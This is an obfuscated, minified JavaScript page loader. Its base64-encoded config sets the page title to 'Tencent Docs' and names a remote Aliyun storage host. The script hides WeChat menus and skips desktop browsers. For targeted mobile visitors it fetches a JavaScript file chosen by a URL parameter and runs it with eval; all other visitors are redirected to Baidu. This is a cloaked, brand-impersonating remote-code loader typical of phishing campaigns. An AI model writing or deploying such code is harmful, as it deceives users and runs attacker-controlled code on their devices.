!function(){document.addEventListener("WeixinJSBridgeReady",function(){WeixinJSBridge.call("hideOptionMenu")}),document.addEventListener("touchmove",function(t){t.preventDefault()},{passive:!1}),Object.getPrototypeOf(window).http_request=function(t,e,n){var o;(o=function(){if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;if("undefined"!=typeof ActiveXObject)return new ActiveXObject("Microsoft.XMLHTTP");throw new Error("XMLHttpRequest is not supported")}()).open("GET",t,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.onreadystatechange=function(){4===this.readyState&&200===this.status&&n(this.responseText)},o.send()},Object.getPrototypeOf(window.document.location).params_get=function(t){if(void 0!==this._params)return this._params[t];if(this._params={},""!==this.search&&"?"!==this.search){var e=this.search.toString();"?"===e.charAt(0)&&(e=e.substring(1));for(var n=e.split("&"),o=0;o<n.length;o++){var i=n[o].split(/=(.+)/),a=decodeURIComponent(i[0]),i=!(1<i.length)||decodeURIComponent(i.slice(1).join(""));!0===(this._params[a]=i)&&(this._params_idx=a)}return this._params[t]}};for(var t=JSON.parse(decodeURIComponent(escape(window.atob("eyJhcGlfdXJpIjoiaHR0cHM6Ly9yZW56aGVuZ3gub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tL2oiLCJsYW5kaW5nX3VyaSI6Imh0dHBzOi8vYmFpZHUuY29tIiwidGl0bGUiOiLohb7orq/mlofmoaMifQ==")))),e=navigator.platform.toLowerCase(),n=["windows","win16","win32","winCE","macintosh","macintel"],o=0;o<n.length;o++)if(e===n[o])return;document.title=t.title,window.document.location.params_get(""),window.document.location._params_idx&&!window.document.location._params_sent?(window.http_request(t.api_uri+"/"+window.document.location._params_idx+".js",2,eval),window.document.location._params_sent=!0):window.location=t.landing_uri}((window,document));